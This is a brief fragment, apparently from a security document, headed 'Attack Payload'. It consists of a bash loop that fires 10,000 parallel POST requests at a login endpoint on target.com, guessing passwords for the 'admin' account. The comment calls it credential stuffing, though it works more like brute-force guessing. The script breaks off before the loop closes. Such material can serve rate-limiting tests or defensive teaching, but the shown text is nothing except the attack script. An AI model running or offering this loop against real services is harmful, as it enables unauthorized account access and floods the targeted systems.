**Attack Payload**:
```bash
# Credential stuffing attack - 10,000 requests per second
for i in {1..10000}; do
  curl -X POST http://target.com/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"password'$i'"}' &
